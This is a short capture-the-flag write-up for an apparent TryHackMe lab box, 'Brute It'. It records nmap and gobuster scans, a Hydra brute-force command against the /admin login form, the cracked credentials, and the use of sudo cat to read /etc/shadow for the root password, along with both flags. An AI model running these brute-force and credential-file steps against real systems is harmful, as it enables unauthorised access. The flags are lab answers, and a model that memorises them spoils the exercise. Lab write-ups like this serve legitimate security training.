Brute_it.doc
-----------------

name : Eviyatar Cohen

Date : 17.10.2022

IP=10.10.12.192
-----------------------------------------

Nmap Results:
===============
nmap -sC -sV 10.10.12.192
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-17 07:50 EDT
Nmap scan report for 10.10.12.192
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.96 seconds

----------------------------------------------------------------

GoBuster Results:
===================
gobuster dir -u http://10.10.12.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.192
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/17 07:53:34 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.12.192/admin/]

----------------------------------------------------------------

Potential Usernames:
=======================
admin:xavier

Using Hydra To Brute Force Login Page at /admin Directory..
--------------------------------------------------------------
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.12.192 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid"

Password = xavier
================================================================

inside was RSA key that i crack and found this password:rockinroll
-----------------------------------------------

Login ssh to find User.txt:
============================
THM{a_password_is_not_a_barrier}

insdie sudo -l i found cat and use it to open /etc/shadow to get root password
===============
root:football
===============

Root Flag:
============
THM{pr1v1l3g3_3sc4l4t10n}